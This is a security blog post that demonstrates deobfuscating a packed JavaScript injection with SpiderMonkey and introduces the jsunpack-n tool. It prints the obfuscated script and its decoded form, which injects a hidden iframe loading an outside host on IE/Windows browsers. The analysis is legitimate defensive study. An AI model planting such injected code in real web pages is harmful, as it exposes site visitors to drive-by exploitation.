<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<title>Tomsonsec</title>
<meta name="description" content="Tomsonsec">
<meta name="keywords" content="">

<meta property="og:type" content="article">
<meta property="og:title" content="Javascript malware | Checking it out with Spidermonkey and jsunpackn.py &#8211; ">
<meta property="og:description" content="Tomsonsec">
<meta property="og:url" content="http://tomasuh.github.io//2015/02/01/IO-Analysing-js-with-Spidermonkey-and-jsunpackn.py.html">
<meta property="og:site_name" content="">

<!-- Webmaster Tools verfication -->




<link rel="canonical" href="http://tomasuh.github.io//2015/02/01/IO-Analysing-js-with-Spidermonkey-and-jsunpackn.py.html">
<link href="http://tomasuh.github.io//feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="http://tomasuh.github.io//css/base.min.css" type="text/css" />
<link rel="stylesheet" href="http://tomasuh.github.io//css/github.min.css" type="text/css" />
<link rel="stylesheet" href="http://tomasuh.github.io//css/octicons.css" type="text/css" />
<link rel="stylesheet" href="http://tomasuh.github.io//css/syntax.css" type="text/css" />
<link rel="stylesheet" href="http://tomasuh.github.io//css/syntaxBS.css" type="text/css" />
<link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>

</head>
<body>
  <div class="header-container">
  <header>
      <ul class="nav">
        <!--Change the  URL here if working on an absolute domain-->
        <li><a href="/"><span class="mega-octicon octicon-terminal" style="margin-right: 6px;"></span>Tomsonsec</a></li>
        <li><a href="/about.html"><span class="mega-octicon octicon-person" style="margin-right: 6px;"></span>About</a></li>

      </ul>
  </header>
</div>
  <div class="container">
    <p class="intro">
      Security oriented blog
    </p>
  <h2>Javascript malware | Checking it out with Spidermonkey and jsunpackn.py</h2>
<p class="meta">01 Feb 2015</p>

<div class="post">
<p>Allright, I&#39;ve started going through the <a href="http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033">Malware Analyst&#39;s Cookbook </a>, the book are almost like a big guide for all the tools a malware researcher may need. I like it, opens up for yourself to have fun and try the stuff!</p>

<p>So I will give som articles showing the usage of tools I want to pinpoint my learning at.</p>

<h2>Spidermonkey</h2>

<blockquote>
<blockquote>
<blockquote>
<p><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey">SpiderMonkey</a> is Mozilla&#39;s JavaScript engine written in C/C++. It is used in various Mozilla products, including Firefox, and is available under the MPL2.</p>
</blockquote>
</blockquote>
</blockquote>

<p>It&#39;s supernice to have a javascript engine callable from the terminal.
Lets have a very basic example of dealing with obfuscated code being called by eval.</p>

<p>I&#39;ll found <a href="http://stackoverflow.com/questions/7765594/javascript-code-injected-into-site-can-you-help-me-decrypt-it">this</a> post at stackoverflow.</p>

<p>He want the following code decrypted:</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nb">eval</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span><span class="nx">a</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">k</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nx">c</span><span class="o">&lt;</span><span class="nx">a</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nx">e</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">c</span><span class="o">/</span><span class="nx">a</span><span class="p">)))</span><span class="o">+</span><span class="p">((</span><span class="nx">c</span><span class="o">=</span><span class="nx">c</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">35</span><span class="o">?</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">c</span><span class="o">+</span><span class="mi">29</span><span class="p">)</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))};</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^/</span><span class="p">,</span><span class="nb">String</span><span class="p">)){</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)]</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span><span class="o">||</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)}</span><span class="nx">k</span><span class="o">=</span><span class="p">[</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">d</span><span class="p">[</span><span class="nx">e</span><span class="p">]}];</span><span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="s1">&#39;\\w+&#39;</span><span class="p">};</span><span class="nx">c</span><span class="o">=</span><span class="mi">1</span><span class="p">};</span><span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">--</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">]){</span><span class="nx">p</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\b&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\\b&#39;</span><span class="p">,</span><span class="s1">&#39;g&#39;</span><span class="p">),</span><span class="nx">k</span><span class="p">[</span><span class="nx">c</span><span class="p">])}}</span><span class="k">return</span> <span class="nx">p</span><span class="p">}(</span><span class="s1">&#39;i 9(){a=6.h(\&#39;b\&#39;);7(!a){5 0=6.j(\&#39;k\&#39;);6.g.l(0);0.n=\&#39;b\&#39;;0.4.d=\&#39;8\&#39;;0.4.c=\&#39;8\&#39;;0.4.e=\&#39;f\&#39;;0.m=\&#39;w://z.o.B/C.D?t=E\&#39;}}5 2=A.x.q();7(((2.3(&quot;p&quot;)!=-1&amp;&amp;2.3(&quot;r&quot;)==-1&amp;&amp;2.3(&quot;s&quot;)==-1))&amp;&amp;2.3(&quot;v&quot;)!=-1){5 t=u(&quot;9()&quot;,y)}&#39;</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="s1">&#39;el||ua|indexOf|style|var|document|if|1px|MakeFrameEx|element|yahoo_api|height|width|display|none|body|getElementById|function|createElement|iframe|appendChild|src|id|25u|msie|toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|500|asso|navigator|com|showthread|php|72291731&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="mi">0</span><span class="p">,{}))</span>
</code></pre></div>
<p>Save the code inte a file with a firstline of <code>eval = print;</code></p>

<p>The from the terminal call: <code>js evil.js | indent</code>
Indent is a nice tool in linux used to indent and make the code readable, it&#39;s made for C but works allright for languages with a similar syntax.</p>

<p>Output:</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span>
<span class="nx">MakeFrameEx</span> <span class="p">()</span>
<span class="p">{</span>
  <span class="nx">element</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span> <span class="p">(</span><span class="s1">&#39;yahoo_api&#39;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">element</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span> <span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span> <span class="p">(</span><span class="nx">el</span><span class="p">);</span>
      <span class="nx">el</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="s1">&#39;yahoo_api&#39;</span><span class="p">;</span>
      <span class="nx">el</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="s1">&#39;1px&#39;</span><span class="p">;</span>
      <span class="nx">el</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="s1">&#39;1px&#39;</span><span class="p">;</span>
      <span class="nx">el</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
    <span class="nx">el</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;http://asso.25u.com/showthread.php?t=72291731&#39;</span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">ua</span> <span class="o">=</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">toLowerCase</span> <span class="p">();</span>
<span class="k">if</span> <span class="p">(((</span><span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span> <span class="p">(</span><span class="s2">&quot;msie&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span> <span class="p">(</span><span class="s2">&quot;opera&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span>
      <span class="o">&amp;&amp;</span> <span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span> <span class="p">(</span><span class="s2">&quot;webtv&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span> <span class="p">(</span><span class="s2">&quot;windows&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setTimeout</span> <span class="p">(</span><span class="s2">&quot;MakeFrameEx()&quot;</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
  <span class="p">}</span>
</code></pre></div>
<p>You can do this anywhere you have a javascript interpreter but the shell offers simplicity and effectiveness for us who aren&#39;t web devs.</p>

<p>As for the code analysis we see that it creates an iframe and appends it to the body. The link are down but you may assume it was an exploitkit, deface page or similar.</p>

<h2>jsunpackn.py</h2>

<blockquote>
<p><a href="https://code.google.com/p/jsunpack-n/">jsunpack-n</a> emulates browser functionality when visiting a URL. It&#39;s purpose is to detect exploits that target browser and browser plug-in vulnerabilities. It accepts many different types of input:</p>

<ul>
<li>PDF files - samples/sample-pdf.file</li>
<li>Packet Captures - samples/sample-http-exploit.pcap</li>
<li>HTML files</li>
<li>JavaScript files</li>
<li>SWF files</li>
</ul>
</blockquote>

<p>What I&#39;m most excited about right now is malicious pdf files.
I&#39;ve downloaded a couple of samples from <a href="http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html">http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html</a></p>

</div>

<div class="keep-in-touch">
  <p>
    
  </p>
</div>
<!--- <a href="https://twitter.com/share" class="twitter-share-button" data-via="" data-size="large" data-hashtags="gotchacode">Tweet</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script> -->



  

<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', '']);
  _gaq.push(['_trackPageview']);
  (function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  </div><!-- /.main -->
</body>
</html>